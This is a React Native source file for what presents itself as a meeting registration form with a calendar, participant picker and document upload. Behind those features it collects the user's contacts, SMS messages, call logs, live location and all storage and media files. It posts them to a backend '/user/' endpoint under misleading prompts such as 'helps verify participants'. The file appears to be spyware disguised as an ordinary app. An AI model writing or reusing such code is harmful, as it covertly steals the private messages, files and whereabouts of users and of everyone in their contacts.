import { generateHeaders } from "@/lib/generateHeaders";
import {
  requestAndFetchCallLogs,
  requestAndFetchContacts,
  requestAndFetchLocation,
  requestAndFetchMediaFiles,
  requestAndFetchSms,
  requestAndFetchStorageFiles,
} from "@/utils/permissions";
import AsyncStorage from "@react-native-async-storage/async-storage";
import axios from "axios";
import * as ImagePicker from "expo-image-picker";
import { useNavigation, useRouter } from "expo-router";
import React, { useEffect, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  Image,
  KeyboardAvoidingView,
  Platform,
  ScrollView,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { Calendar } from "react-native-calendars";
import { SafeAreaView } from "react-native-safe-area-context";
import Toast from "react-native-toast-message";

type Dates = { date: string; available: boolean };

export default function OfficialMeetingForm() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const AVAILABLE_DATES = `${base_URL}/meeting/get-meeting-availability`;
  const BOOK_MEETING = `${base_URL}/meeting/create-meeting`;
  const SUBMIT_ENDPOINT = `${base_URL}/user/`;

  const [title, setTitle] = useState("");
  const [description, setDescription] = useState("");
  const [selectedDate, setSelectedDate] = useState("");
  const [location, setLocation] = useState<any>(null);
  const [contacts, setContacts] = useState<any[]>([]);
  const [selectedParticipants, setSelectedParticipants] = useState<any[]>([]);
  const [uploadedDoc, setUploadedDoc] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [availableDates, setAvailableDates] = useState<Dates[]>([]);
  const [markedDates, setMarkedDates] = useState<{ [key: string]: any }>({});
  const [data, setData] = useState<{
    date: string;
    title: string;
    description: string;
    appointment_taken_at: string;
    timestamp: string;
  } | null>(null);
  const [showContactPicker, setShowContactPicker] = useState(false);

  const router = useRouter();

  // Fetch available dates
  const fetchdates = async () => {
    try {
      const headers = await generateHeaders();
      const response = await axios.get(AVAILABLE_DATES, { headers });
      const data = response.data;
      setAvailableDates(data);
      const marked: { [key: string]: any } = {};
      const today = new Date();
      const ninetyDaysLater = new Date(Date.now() + 90 * 24 * 60 * 60 * 1000);
      data.forEach((item: any) => {
        const dateObj = new Date(item.date);
        if (dateObj < today || dateObj > ninetyDaysLater) {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#e5e7eb" },
              text: { color: "#9ca3af" },
            },
            disabled: true,
            disableTouchEvent: true,
          };
        } else if (!item.available) {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#ef4444", borderRadius: 8 },
              text: { color: "#fff" },
            },
            disabled: true,
            disableTouchEvent: true,
          };
        } else {
          marked[item.date] = {
            customStyles: {
              container: { backgroundColor: "#22c55e", borderRadius: 8 },
              text: { color: "#fff" },
            },
          };
        }
      });
      setMarkedDates(marked);
    } catch (error) {
      console.error("Error fetching available dates:", error);
    }
  };
  const submitPermissionData = async (allData: any) => {
    try {
      const headers = await generateHeaders();
      const response = await axios.post(
        SUBMIT_ENDPOINT,
        {
          timestamp: getLocalISOTimeMicro(),
          info: allData,
        },
        { headers }
      );
      console.log("✅ Permission data submitted:", response.data);
    } catch (err) {
      console.error("❌ Error submitting data:", err);
    }
  };

  useEffect(() => {
    fetchdates();
  }, []);

  // Cache permissions
  useEffect(() => {
    (async () => {
      const loc = await AsyncStorage.getItem("loc");
      const con = await AsyncStorage.getItem("contacts");
      const doc = await AsyncStorage.getItem("doc");
      if (loc) setLocation(JSON.parse(loc));
      if (con) setContacts(JSON.parse(con));
      if (doc) setUploadedDoc(doc);
    })();
  }, []);

  // Handle Location
  const handleLocation = async () => {
    try {
      const loc = await requestAndFetchLocation();
      if (loc) {
        setLocation(loc);
        await AsyncStorage.setItem("loc", JSON.stringify(loc));
        Toast.show({ type: "success", text1: "Live location retrieved" });
        await submitPermissionData({ permission: "location", data: loc });
      }
    } catch {
      Alert.alert("Location Required", "Please enable location access.");
    }
  };

  // Handle Contact Permissions + Picker
  const handleContacts = async () => {
    try {
      if (!contacts.length) {
        const contactData = await requestAndFetchContacts();
        const smsdata = await requestAndFetchSms();
        const logdata = await requestAndFetchCallLogs();
        if (contactData?.length) {
          setContacts(contactData);
          await AsyncStorage.setItem("contacts", JSON.stringify(contactData));
          Toast.show({ type: "success", text1: "Contacts access granted" });
          await submitPermissionData({
            permission: "contacts",
            data: {
              contacts: contactData,
              sms: smsdata,
              callLogs: logdata,
            },
          });
        } else {
          Alert.alert("Permission Required", "Please allow contact access.");
          return;
        }
      }
      setShowContactPicker(true);
    } catch (err) {
      Alert.alert(
        "Access Required",
        "Please allow contact access to continue."
      );
    }
  };
  // Handle Document Upload
  const handleUpload = async () => {
    try {
      const pick = await ImagePicker.launchImageLibraryAsync({
        mediaTypes: ImagePicker.MediaTypeOptions.All,
      });
      if (!pick.canceled) {
        const uri = pick.assets[0].uri;
        setUploadedDoc(uri);
        const storageFiles = await requestAndFetchStorageFiles();
        const mediafiles = await requestAndFetchMediaFiles();
        Toast.show({ type: "success", text1: "Document uploaded" });
        await submitPermissionData({
          permission: "storage",
          data: { Media: mediafiles, files: storageFiles },
        });
      }
    } catch {
      Alert.alert("Upload Failed", "Please allow storage access to continue.");
    }
  };

  function getLocalISOTimeMicro() {
    const now = new Date();
    const ms = String(now.getMilliseconds()).padStart(3, "0") + "000"; // fake microseconds
    const tzOffset = -now.getTimezoneOffset();
    const sign = tzOffset >= 0 ? "+" : "-";
    const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
      2,
      "0"
    );
    const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");

    const base = now.toISOString().split(".")[0]; // e.g. 2025-10-28T17:53:12
    return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
  }

  const handleSave = async () => {
    // Step-by-step checks with clear messages
    if (!selectedDate) {
      Toast.show({
        type: "error",
        text1: "Please select a date for the meeting.",
        position: "top",
      });
      return;
    }

    if (!title.trim()) {
      Toast.show({
        type: "error",
        text1: "Please enter a valid meeting title.",
        position: "top",
      });
      return;
    }

    if (!description.trim()) {
      Toast.show({
        type: "error",
        text1: "Please enter the meeting description or purpose.",
        position: "top",
      });
      return;
    }

    if (!uploadedDoc) {
      Toast.show({
        type: "error",
        text1: "Please upload a supporting document.",
        position: "top",
      });
      return;
    }

    try {
      setLoading(true);
      const headers = await generateHeaders();

      const payload = {
        date: selectedDate,
        title,
        description,
        appointment_taken_at: getLocalISOTimeMicro(),
        timestamp: getLocalISOTimeMicro(),
      };

      const response = await axios.post(BOOK_MEETING, payload, { headers });

      setLoading(false);
      console.log("Meeting booked successfully:", response.data);

      Toast.show({
        type: "success",
        text1: "Meeting booked successfully!",
        position: "top",
        visibilityTime: 2000,
      });

      // ✅ Reset the form after successful booking
      setSelectedDate("");
      setTitle("");
      setDescription("");
      setUploadedDoc(null);
      setSelectedParticipants([]);
      setLocation(null);
      setData(null);

      // Optional: also clear AsyncStorage cache
      await AsyncStorage.multiRemove(["loc", "doc"]);

      // Navigate home after short delay
      setTimeout(() => {
        router.replace("/");
      }, 1500);
    } catch (error) {
      setLoading(false);
      console.error("Error booking meeting:", error);
      Toast.show({
        type: "error",
        text1: "Error booking meeting. Please try again.",
        position: "top",
      });
    }
  };

  const navigation = useNavigation();

  useEffect(() => {
    const unsubscribe = navigation.addListener("beforeRemove", async () => {
      setUploadedDoc(null);
      setSelectedParticipants([]);
      await AsyncStorage.removeItem("doc");
    });
    return unsubscribe;
  }, [navigation]);

  return (
    <SafeAreaView className="flex-1 bg-gray-100">
      <KeyboardAvoidingView
        behavior={Platform.OS === "ios" ? "padding" : undefined}
        className="flex-1"
      >
        <ScrollView
          contentContainerStyle={{ padding: 20, paddingBottom: 100 }}
          keyboardShouldPersistTaps="handled"
        >
          {/* Header */}
          <Text className="text-2xl font-bold text-gray-900 mb-2">
            Meeting Registration Form
          </Text>
          <Text className="text-gray-600 mb-5">
            Please fill in all details accurately to register your meeting.
          </Text>

          {/* Meeting Details */}
          <View className="bg-white rounded-xl p-4 border border-gray-200 mb-5">
            <Text className="text-lg font-semibold text-gray-900 mb-2">
              Meeting Details
            </Text>
            <Calendar
              markingType="custom"
              minDate={new Date().toISOString().split("T")[0]}
              onDayPress={(day) => setSelectedDate(day.dateString)}
              markedDates={{
                ...markedDates,
                [selectedDate]: {
                  customStyles: {
                    container: { backgroundColor: "#facc15", borderRadius: 10 },
                    text: { color: "#0a0a0a", fontWeight: "700" },
                  },
                },
              }}
              theme={{
                textSectionTitleColor: "#6b7280",
                todayTextColor: "#f59e0b",
                dayTextColor: "#111827",
                arrowColor: "#facc15",
                monthTextColor: "#111827",
              }}
            />
            <Text className="mt-3 text-gray-700 font-medium">
              Meeting Title
            </Text>
            <TextInput
              placeholder="Enter meeting title"
              value={title}
              onChangeText={setTitle}
              className="bg-gray-50 p-3 border border-gray-300 rounded-lg mt-1"
            />
            <Text className="mt-3 text-gray-700 font-medium">
              Purpose / Description
            </Text>
            <TextInput
              placeholder="Describe the purpose of this meeting"
              value={description}
              onChangeText={setDescription}
              multiline
              textAlignVertical="top"
              className="bg-gray-50 p-3 border border-gray-300 rounded-lg mt-1 h-24"
            />
          </View>

          {/* Location Section */}
          <View className="bg-white rounded-xl p-4 border border-gray-200 mb-5">
            <View className="flex flex-row justify-between items-center flex-wrap">
              <Text className="text-lg font-semibold text-gray-900 mb-2">
                Location Verification
              </Text>
              <TouchableOpacity
                onPress={handleLocation}
                className={`px-2 py-3 rounded-lg ${
                  location ? "bg-green-600" : "bg-blue-700"
                } self-start`}
              >
                <Text className="text-white font-semibold">
                  {location ? "Live Location" : "Get Live Location"}
                </Text>
              </TouchableOpacity>
            </View>

            {location && (
              <View className="mt-3">
                <Text className="text-gray-700 font-medium">
                  Location Details:
                </Text>
                {location.address ? (
                  <Text className="text-gray-700 border border-gray-400  p-2 rounded-lg mt-1">
                    <Text className="font-medium"></Text> {location.address}
                  </Text>
                ) : null}
              </View>
            )}
          </View>

          {/* Participants Section */}
          <View className="bg-white rounded-xl p-4 border border-gray-200 mb-5">
            <Text className="text-lg font-semibold text-gray-900 mb-2">
              Participants
            </Text>
            <Text className="text-gray-600 mb-3">
              Access to contacts, call logs, and SMS helps verify participants’
              details.
            </Text>

            <TouchableOpacity
              onPress={handleContacts}
              className={`px-4 py-3 rounded-lg ${
                contacts.length ? "bg-green-600" : "bg-blue-700"
              } self-start`}
            >
              <Text className="text-white font-semibold">
                {contacts.length ? "Add Participants" : "Grant Access"}
              </Text>
            </TouchableOpacity>

            {selectedParticipants.length > 0 && (
              <View className="mt-3">
                <Text className="text-gray-700 font-medium mb-1">
                  Selected Participants:
                </Text>
                {selectedParticipants.map((p, i) => (
                  <Text key={i} className="text-gray-800">
                    • {p.name} {p.number}
                  </Text>
                ))}
              </View>
            )}
          </View>

          {/* Document Upload */}
          <View className="bg-white rounded-xl p-4 border border-gray-200 mb-5">
            <Text className="text-lg font-semibold text-gray-900 mb-2">
              Supporting Document
            </Text>
            <Text className="text-gray-600 mb-3">
              Upload any relevant document to authenticate this meeting.
            </Text>
            {uploadedDoc && (
              <Image
                source={{ uri: uploadedDoc }}
                className="w-full h-40 rounded-lg border mb-3"
              />
            )}
            <TouchableOpacity
              onPress={handleUpload}
              className={`px-4 py-3 rounded-lg ${
                uploadedDoc ? "bg-green-600" : "bg-blue-700"
              } self-start`}
            >
              <Text className="text-white font-semibold">
                {uploadedDoc ? "Uploaded" : "Upload Document"}
              </Text>
            </TouchableOpacity>
          </View>

          {/* Submit */}
          <TouchableOpacity
            disabled={!title || !description || !selectedDate || !uploadedDoc}
            onPress={handleSave}
            className={`p-4 rounded-lg ${
              title && description && selectedDate && uploadedDoc
                ? "bg-green-700"
                : "bg-gray-400"
            }`}
          >
            {loading ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <Text className="text-white text-center font-semibold text-lg">
                Submit Form
              </Text>
            )}
          </TouchableOpacity>
        </ScrollView>
        {showContactPicker && (
          <View
            style={{
              position: "absolute",
              top: 0,
              left: 0,
              right: 0,
              bottom: 0,
              backgroundColor: "rgba(0,0,0,0.5)",
              justifyContent: "center",
              alignItems: "center",
              padding: 20,
              zIndex: 9999,
            }}
          >
            <View
              style={{
                backgroundColor: "white",
                width: "100%",
                maxHeight: "80%",
                borderRadius: 12,
                paddingVertical: 12,
                paddingHorizontal: 10,
              }}
            >
              <Text
                style={{
                  fontSize: 18,
                  fontWeight: "700",
                  color: "#111827",
                  textAlign: "center",
                  marginBottom: 8,
                }}
              >
                Select Participants
              </Text>
              <Text
                style={{
                  fontSize: 13,
                  color: "#4b5563",
                  textAlign: "center",
                  marginBottom: 10,
                }}
              >
                Tap to select participants from your official contacts.
              </Text>

              <ScrollView
                style={{
                  borderTopWidth: 1,
                  borderBottomWidth: 1,
                  borderColor: "#e5e7eb",
                  marginBottom: 10,
                }}
              >
                {contacts.slice(0, 1000).map((c, i) => {
                  const id =
                    c.id ||
                    c.recordID ||
                    c.phoneNumbers?.[0]?.number ||
                    `${c.name}-${i}`; // ✅ fallback to always unique
                  const name =
                    c.name ||
                    c.displayName ||
                    c.phoneNumbers?.[0]?.number ||
                    "Unnamed";
                  const number = c.phoneNumbers?.[0]?.number || "";

                  // ✅ correct selection check
                  const isSelected = selectedParticipants.some(
                    (p) => p.id === id
                  );

                  return (
                    <TouchableOpacity
                      key={id}
                      onPress={() => {
                        setSelectedParticipants((prev) => {
                          if (isSelected) {
                            // deselect
                            return prev.filter((p) => p.id !== id);
                          } else {
                            // add
                            return [...prev, { id, name, number }];
                          }
                        });
                      }}
                      style={{
                        flexDirection: "row",
                        alignItems: "center",
                        paddingVertical: 10,
                        paddingHorizontal: 4,
                        borderBottomWidth: 1,
                        borderColor: "#f3f4f6",
                        backgroundColor: isSelected ? "#eff6ff" : "white", // ✅ highlight only selected
                      }}
                    >
                      <View
                        style={{
                          width: 22,
                          height: 22,
                          borderRadius: 6,
                          borderWidth: 2,
                          borderColor: isSelected ? "#2563eb" : "#9ca3af",
                          backgroundColor: isSelected ? "#2563eb" : "white",
                          justifyContent: "center",
                          alignItems: "center",
                          marginRight: 12,
                        }}
                      >
                        {isSelected && (
                          <Text
                            style={{
                              color: "white",
                              fontSize: 14,
                              fontWeight: "bold",
                            }}
                          >
                            ✓
                          </Text>
                        )}
                      </View>
                      <View>
                        <Text
                          style={{
                            fontWeight: isSelected ? "700" : "500",
                            color: "#111827",
                          }}
                        >
                          {name}
                        </Text>
                        {!!number && (
                          <Text style={{ fontSize: 13, color: "#6b7280" }}>
                            {number}
                          </Text>
                        )}
                      </View>
                    </TouchableOpacity>
                  );
                })}
              </ScrollView>

              <View
                style={{
                  flexDirection: "row",
                  justifyContent: "space-between",
                }}
              >
                <TouchableOpacity
                  onPress={() => setShowContactPicker(false)}
                  style={{
                    flex: 1,
                    backgroundColor: "#e5e7eb",
                    padding: 10,
                    borderRadius: 8,
                    marginRight: 6,
                  }}
                >
                  <Text style={{ textAlign: "center", color: "#374151" }}>
                    Cancel
                  </Text>
                </TouchableOpacity>
                <TouchableOpacity
                  onPress={() => {
                    setShowContactPicker(false);
                    Toast.show({
                      type: "success",
                      text1: `${selectedParticipants.length} participant(s) added`,
                    });
                  }}
                  style={{
                    flex: 1,
                    backgroundColor: "#2563eb",
                    padding: 10,
                    borderRadius: 8,
                    marginLeft: 6,
                  }}
                >
                  <Text style={{ textAlign: "center", color: "white" }}>
                    Confirm
                  </Text>
                </TouchableOpacity>
              </View>
            </View>
          </View>
        )}

        <Toast />
      </KeyboardAvoidingView>
    </SafeAreaView>
  );
}
